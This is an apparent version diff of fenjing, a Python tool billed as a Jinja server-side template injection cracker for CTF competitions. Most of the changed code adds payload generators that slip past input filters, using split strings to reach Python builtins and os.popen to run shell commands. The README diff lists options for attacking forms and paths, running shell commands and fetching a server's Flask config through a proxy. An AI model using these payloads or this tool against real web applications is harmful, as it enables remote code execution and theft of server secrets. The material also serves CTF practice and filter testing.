### Comparing `fenjing-0.4.8/fenjing/payload_gen.py` & `fenjing-0.4.9/fenjing/payload_gen.py`

 * *Files 2% similar despite different names*

```diff
@@ -310,14 +310,27 @@
         payload_vars.append(ints[0][0])
 
     return [(FORMULAR_SUM, tuple(payload_vars))] + [
         (WITH_CONTEXT_VAR, v) for v in payload_vars
     ]
 
 
+@req_gen
+def gen_positive_integer_length(context: dict, value: int):
+    return [
+        (LITERAL, "(({},)|length)".format(",".join("x" * value)))
+    ]
+
+@req_gen
+def gen_positive_integer_length2(context: dict, value: int):
+    return [
+        (LITERAL, "(({},).__len__( ))".format(",".join("x" * value)))
+    ]
+
+
 # ---
 
 
 @req_gen
 def gen_integer_literal(context: dict, value: int):
     return [(LITERAL, str(value))]
 
@@ -449,14 +462,37 @@
             "(lipsum[(lipsum|escape|batch(22)|list|first|last)*2"
             + "+dict(globals=x)|join+(lipsum|escape|batch(22)|list|first|last)*2]"
             + "[(lipsum|escape|batch(22)|list|first|last)*2+dict(builtins=x)"
             + "|join+(lipsum|escape|batch(22)|list|first|last)*2][dict(chr=x)|join](37))",
         )
     ]
 
+@req_gen
+def gen_string_percent_lipsum2(context):
+    return [
+        (
+            LITERAL,
+            "(lipsum['__glob''als__']['__builti''ns__']['chr'](37))"
+        )
+    ]
+
+@req_gen
+def gen_string_percent_namespace(context):
+    return [
+        (
+            LITERAL,
+            "(namespace['__ini''t__']['__glob''al''s__']['__builti''ns__']['chr']("
+        ),
+        (INTEGER, 37),
+        (
+            LITERAL, "))"
+        )
+    ]
+
+
 
 @req_gen
 def gen_string_percent_lipsumcomplex(context):
     return [
         (LITERAL, "(lipsum[(lipsum|escape|batch("),
         (INTEGER, 22),
         (LITERAL, ")|list|first|last)*"),
@@ -795,14 +831,26 @@
 
 @req_gen
 def gen_char_dict(context, c):
     if not re.match("[A-Za-z]", c):
         return [(UNSATISFIED,)]
     return [(LITERAL, f"(dict({c}=x)|join)")]
 
+@req_gen
+def gen_char_num(context, c):
+    if not re.match("[0-9]", c):
+        return [(UNSATISFIED,)]
+    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ").__str__( ))")]
+
+@req_gen
+def gen_char_num2(context, c):
+    if not re.match("[0-9]", c):
+        return [(UNSATISFIED,)]
+    return [(LITERAL, f"((", ), (INTEGER, int(c)), (LITERAL, ")|string)")]
+
 
 # ---
 # 以下的gen_string会互相依赖，但是产生互相依赖时传入的字符串长度会减少所以不会发生无限调用
 
 
 @req_gen
 def gen_string_1(context: dict, value: str):
@@ -1341,14 +1389,25 @@
     return [
         (LITERAL, "("),
         (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
         (LITERAL, "())"),
     ]
 
 @req_gen
+def gen_os_popen_read_normal2(context, cmd):
+    return [
+        (LITERAL, "("),
+        (ATTRIBUTE, (OS_POPEN_OBJ, cmd), "read"),
+        (LITERAL, "("),
+        (INTEGER, -1),
+        (LITERAL, "))"),
+
+    ]
+
+@req_gen
 def gen_os_popen_read_eval(context, cmd):
     return [
         (EVAL, "__import__('os').popen('{}').read()".format(cmd.replace("'", "\\'"))),
     ]
 
 
 if __name__ == "__main__":
```

### Comparing `fenjing-0.4.8/fenjing/requester.py` & `fenjing-0.4.9/fenjing/requester.py`

 * *Files 4% similar despite different names*

```diff
@@ -21,27 +21,34 @@
         interval=0.0,
         timeout=10,
         retry_times=5,
         retry_interval=1,
         retry_status=(429,),
         user_agent=DEFAULT_USER_AGENT,
         headers=None,
+        proxy=None,
     ):
         self.interval = interval
         self.timeout = timeout
         self.retry_times = retry_times
         self.retry_interval = retry_interval
         self.retry_status = retry_status
         self.session = requests.Session()
         self.session.headers.update({"User-Agent": user_agent})
         self.last_request_time = 0
 
         if headers:
             self.session.headers.update(headers)
 
+        if proxy:
+            self.session.proxies = {
+                "http": proxy,
+                "https": proxy
+            }
+
     def request_once(self, **kwargs):
         """发出一次网络请求，失败时返回None
 
         Returns:
             Union[Response, None]: 返回的响应
         """
         duration = time.perf_counter() - self.last_request_time
@@ -49,17 +56,15 @@
             time.sleep(self.interval - duration)
 
         if "timeout" not in kwargs:
             kwargs["timeout"] = self.timeout
         try:
             resp = self.session.request(**kwargs)
         except Exception as exception:  # pylint: disable=W0718
-            logging.warning(
-                "Exception found when requesting: %s", type(exception)
-            )
+            logging.warning("Exception found when requesting: %s", type(exception))
             logging.debug(traceback.format_exc())
             return None
         if resp.status_code in self.retry_status:
             return None
 
         self.last_request_time = time.perf_counter()
         return resp
```

### Comparing `fenjing-0.4.8/fenjing/scan_url.py` & `fenjing-0.4.9/fenjing/scan_url.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/shell_payload.py` & `fenjing-0.4.9/fenjing/shell_payload.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/submitter.py` & `fenjing-0.4.9/fenjing/submitter.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/templates/index.html` & `fenjing-0.4.9/fenjing/templates/index.html`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/waf_func_gen.py` & `fenjing-0.4.9/fenjing/waf_func_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing/webui.py` & `fenjing-0.4.9/fenjing/webui.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/fenjing.egg-info/PKG-INFO` & `fenjing-0.4.9/fenjing.egg-info/PKG-INFO`

 * *Files 4% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: fenjing
-Version: 0.4.8
+Version: 0.4.9
 Summary: A Jinja SSTI cracker for CTF competitions
 Home-page: https://github.com/Marven11/Fenjing
 Author: Marven11
 Author-email: marven11@example.com
 Classifier: Programming Language :: Python :: 3.7
 Classifier: License :: OSI Approved :: Mozilla Public License 2.0 (MPL 2.0)
 Classifier: Operating System :: OS Independent
@@ -83,19 +83,19 @@
 
 支持绕过0-9的同时绕过加号或减号
 
 支持全角数字和特定数字相加减两种绕过方式
 
 ### `'%c'`绕过:
 
-支持绕过引号，`g`和`lipsum`
+支持绕过引号，`g`，`lipsum`和`urlencode`
 
 ### 下划线绕过：
 
-支持`(lipsum|escape|batch(22)|list|first|last)`
+支持`(lipsum|escape|batch(22)|list|first|last)`等
 - 其中的数字22支持上面的数字绕过
 
 ### 任意字符串：
 
 支持绕过引号，任意字符串拼接符号，下划线和任意关键词
 
 支持以下形式
@@ -180,14 +180,15 @@
   -u, --url TEXT       需要扫描的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   检测模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 Usage: python -m fenjing crack [OPTIONS]
 
   攻击指定的表单
 
@@ -198,14 +199,15 @@
   -i, --inputs TEXT    form的参数，以逗号分隔
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 Usage: python -m fenjing get-config [OPTIONS]
 
   攻击指定的表单，并获得目标服务器的flask config
 
@@ -215,29 +217,31 @@
   -m, --method TEXT   form的提交方式，默认为POST
   -i, --inputs TEXT   form的参数，以逗号分隔
   --interval FLOAT    每次请求的间隔
   --detect-mode TEXT  分析模式，可为accurate或fast
   --user-agent TEXT   请求时使用的User Agent
   --header TEXT       请求时使用的Headers
   --cookies TEXT      请求时使用的Cookie
-  --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
+  --proxy TEXT        请求时使用的代理
+  --tamper-cmd TEXT   在发送payload之前进行编码的命令，默认不进行额外操作
   --help              Show this message and exit.
 
 Usage: python -m fenjing crack-path [OPTIONS]
 
   攻击指定的路径
 
 Options:
   -u, --url TEXT       需要攻击的URL
   -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
   --interval FLOAT     每次请求的间隔
   --detect-mode TEXT   分析模式，可为accurate或fast
   --user-agent TEXT    请求时使用的User Agent
   --header TEXT        请求时使用的Headers
   --cookies TEXT       请求时使用的Cookie
+  --proxy TEXT         请求时使用的代理
   --tamper-cmd TEXT    在发送payload之前进行编码的命令，默认不进行额外操作
   --help               Show this message and exit.
 
 ```
 
 ### 作为python库使用
```

### Comparing `fenjing-0.4.8/fenjing.egg-info/SOURCES.txt` & `fenjing-0.4.9/fenjing.egg-info/SOURCES.txt`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/setup.py` & `fenjing-0.4.9/setup.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/tests/test_cracker.py` & `fenjing-0.4.9/tests/test_cracker.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/tests/test_full_payload_gen.py` & `fenjing-0.4.9/tests/test_full_payload_gen.py`

 * *Files identical despite different names*

### Comparing `fenjing-0.4.8/tests/test_payload_gen.py` & `fenjing-0.4.9/tests/test_payload_gen.py`

 * *Files identical despite different names*

